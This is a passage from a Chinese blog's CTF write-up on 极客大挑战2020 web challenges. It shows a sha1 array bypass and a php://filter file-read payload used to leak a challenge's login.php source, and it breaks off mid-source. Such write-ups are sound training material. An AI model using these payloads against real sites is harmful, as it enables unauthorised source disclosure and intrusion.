@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web-Welcome#请求方法+sha1哈希绕过 打开是405错误，抓包后看到是Method Not Allowed  搜索后发现是请求方式错误，换成POST传参就可以拿到源码了 1234567891011121314&lt;?phperror_reporting(0);if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] !&#x3D;&#x3D; &#x27;POST&#x27;)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战2020wp--web(已做完)">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="web-Welcome#请求方法+sha1哈希绕过 打开是405错误，抓包后看到是Method Not Allowed  搜索后发现是请求方式错误，换成POST传参就可以拿到源码了 1234567891011121314&lt;?phperror_reporting(0);if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] !&#x3D;&#x3D; &#x27;POST&#x27;)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111103144660.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111103817580.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111105042421.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111131938206.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111132028751.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111132049726.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111135849147.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111135917811.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111141307731.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111142218492.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111204504679.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111204539582.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250120234859048.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250120231630388.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250120235942784.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250121000217160.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250217233813121.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250217234027610.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218124923898-1739854166953-1.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218002000777.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218002143051.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218002817953.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163230150.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163448507.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163346610.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250218163427394.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324201553670.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324201642213.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324202105259.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250324203657554.png">
+<meta property="article:published_time" content="2025-03-24T12:40:24.000Z">
+<meta property="article:modified_time" content="2025-03-24T12:43:40.141Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="极客大挑战2020">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111103144660.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>极客大挑战2020wp--web(已做完)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/24/CVE-2019-11043%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=极客大挑战2020wp--web(已做完)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=极客大挑战2020wp--web(已做完)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=极客大挑战2020wp--web(已做完)&body=Check out this article: https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=极客大挑战2020wp--web(已做完)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=极客大挑战2020wp--web(已做完)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/03/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020wp-web(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=极客大挑战2020wp--web(已做完)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-Welcome"><span class="toc-number">1.</span> <span class="toc-text">web-Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95-sha1%E5%93%88%E5%B8%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">#请求方法+sha1哈希绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-Myblog"><span class="toc-number">2.</span> <span class="toc-text">web-Myblog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-zip%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.1.</span> <span class="toc-text">#任意文件读取+zip伪协议文件上传</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-Rceme"><span class="toc-number">3.</span> <span class="toc-text">web-Rceme</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E8%BF%90%E7%AE%97"><span class="toc-number">3.1.</span> <span class="toc-text">哈希运算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E8%84%9A%E6%9C%ACpoc"><span class="toc-number">3.2.</span> <span class="toc-text">取反脚本poc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flagshop"><span class="toc-number">4.</span> <span class="toc-text">flagshop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">4.1.</span> <span class="toc-text">#CSRF跨站请求伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%B4%E4%B8%AAMD5%E6%88%AA%E6%96%AD%E5%8A%A0%E5%AF%86%E7%9A%84%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text">贴个MD5截断加密的解密脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Greatphp"><span class="toc-number">5.</span> <span class="toc-text">Greatphp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">5.1.</span> <span class="toc-text">Exception原生类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">5.2.</span> <span class="toc-text">Error原生类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FighterFightsInvincibly"><span class="toc-number">6.</span> <span class="toc-text">FighterFightsInvincibly</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#creat-function-%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.</span> <span class="toc-text">creat_function()函数</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        极客大挑战2020wp--web(已做完)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-24T12:40:24.000Z" class="dt-published" itemprop="datePublished">2025-03-24</time>
+        
+        (Updated: <time datetime="2025-03-24T12:43:40.141Z" class="dt-updated" itemprop="dateModified">2025-03-24</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/" rel="tag">极客大挑战2020</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="web-Welcome"><a href="#web-Welcome" class="headerlink" title="web-Welcome"></a>web-Welcome</h1><h2 id="请求方法-sha1哈希绕过"><a href="#请求方法-sha1哈希绕过" class="headerlink" title="#请求方法+sha1哈希绕过"></a>#请求方法+sha1哈希绕过</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111103144660.png" alt="image-20250111103144660"></p>
+<p>打开是405错误，抓包后看到是Method Not Allowed</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111103817580.png" alt="image-20250111103817580"></p>
+<p>搜索后发现是请求方式错误，换成POST传参就可以拿到源码了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;roam1&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;roam2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;roam1&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;roam2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;roam1&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;roam2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();  <span class="comment">// collect information from phpinfo!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面都是刚刚遇到的，我们只需要关注最后一个else if语句就可以了</p>
+<p>一个简单的sha1哈希绕过，传数组就可以了</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111105042421.png" alt="image-20250111105042421"></p>
+<p>然后在里面查找flag就可以了</p>
+<h1 id="web-Myblog"><a href="#web-Myblog" class="headerlink" title="web-Myblog"></a>web-Myblog</h1><h2 id="任意文件读取-zip伪协议文件上传"><a href="#任意文件读取-zip伪协议文件上传" class="headerlink" title="#任意文件读取+zip伪协议文件上传"></a>#任意文件读取+zip伪协议文件上传</h2><p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111131938206.png" alt="image-20250111131938206"></p>
+<p>可以看到有登录入口，测试一下</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111132028751.png" alt="image-20250111132028751"></p>
+<p>输入1和1后页面显示</p>
+<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250111132049726.png" alt="image-20250111132049726"></p>
+<p>可以看到url中有admin和user，应该是需要管理员登陆，我们先fuzz一下sql注入什么的，但是发现打不进去，后来发现在url中有?page&#x3D;login参数，猜测可能是任意文件读取漏洞，试一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?page=php:<span class="comment">//filter/read=convert.base64-encode/resource=login.php</span></span><br></pre></td></tr></table></figure>
+
+<p>没读出来，但是根据之前的url猜测是闭合了php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?page=php://filter/read=convert.base64-encode/resource=login</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">//login.php</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;all,follow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/style.default.css&quot;</span> <span class="attr">id</span>=<span class="string">&quot;theme-stylesheet&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;page login-page&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container d-flex align-items-center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-holder has-shadow&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Logo &amp; Information Panel--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-6&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info d-flex align-items-center&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>欢迎登录<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">p</span>&gt;</span>—— 博客后台 ——<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Form Panel    --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-lg-6 bg-white&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form d-flex align-items-center&quot;</span>&gt;</span></span><br><span 